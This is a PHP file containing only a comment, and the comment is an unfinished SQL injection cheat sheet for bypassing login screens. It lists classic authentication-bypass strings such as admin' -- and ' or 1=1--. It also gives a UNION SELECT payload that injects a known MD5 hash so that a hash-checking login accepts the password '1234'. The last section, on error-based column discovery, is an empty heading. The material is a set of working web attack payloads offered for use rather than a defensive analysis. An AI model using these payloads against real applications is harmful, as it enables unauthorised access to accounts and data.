<?php

/*By passing Login Screens */
/*  SQL Injection 101, Login tricks

    admin' --
    admin' #
    admin'/*
    ' or 1=1--
    ' or 1=1#
    ' or 1=1/*
    ') or '1'='1--
    ') or ('1'='1--


/*******************************************************
Bypassing second MD5 hash check login screens
*******************************************************


If application is first getting the record by username and then compare returned MD5 with supplied password's MD5 then you need to some extra tricks to fool application to bypass authentication.
You can union results with a known password and MD5 hash of supplied password. 
In this case application will compare your password and your supplied MD5 hash instead of MD5 from database.

    Bypassing MD5 Hash Check Example (MSP)

Username :admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'
Password : 1234

81dc9bdb52d04dc20036dbd8313ed055 = MD5(1234)



    

*******************************************************
Error Based - Find Columns Names
*******************************************************
















*/
?> 